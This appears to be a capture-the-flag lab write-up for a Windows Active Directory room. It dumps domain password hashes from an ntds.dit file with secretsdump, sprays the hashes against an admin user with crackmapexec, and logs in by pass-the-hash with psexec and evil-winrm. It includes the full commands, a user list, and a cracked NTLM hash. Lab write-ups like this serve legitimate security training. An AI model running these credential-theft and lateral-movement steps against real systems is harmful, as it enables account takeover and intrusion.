Let's see if we can get some passwords or hashes from the ntds.dit file that we got from the zip file

Will use secretsdump aka from impacket toolkit
```
secretsdump.py -system system.hive -security SECURITY -ntds ntds.dit local
```

![[Pasted image 20230920161532.png]]

Now the question stands is how to extract the hash part from the file
As we know from the info that the hash is NTLM so we have to make a script accordingly

```
cat ntds_dump.txt | cut -d':' -f4 | tee final_hash.txt
```

![[Pasted image 20230920170824.png]]
We got the file which can be passed as an hash now

We u recall we got the users list:
Modified User list 
```
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams roastpotatoes
sbradley
clin
```

Will try for lvetrova who's the admin 
```
crackmapexec -t 100 smb 10.10.213.74 -u lvetrova -d raz0rblack.thm -H final_hash.txt --continue-on-success
```

note: delete the extra text in the final_hash.txt to avoid the errors and it took like 2-3 minute before i got the result aka hash
![[Pasted image 20230920173438.png]]
As u can see the script stopped once we got the hash.

```
f220d3988deb3f516c73f40ee16c431d
```

User: lvetrova
Hash: f220d3988deb3f516c73f40ee16c431d

Will try to run psexec.py
```
psexec.py raz0rblack.thm/lvetrova@10.10.213.74 -H f220d3988deb3f516c73f40ee16c431d
```

I don't know but psexec is not running as we want to

Let's try with another tool evil-winrm
https://github.com/Hackplayers/evil-winrm

Command to install 
```
gem install evil-winrm
```

```
evil-winrm  -i 10.10.213.74 -u lvetrova -H 'f220d3988deb3f516c73f40ee16c431d'
```
![[Pasted image 20230920175200.png]]

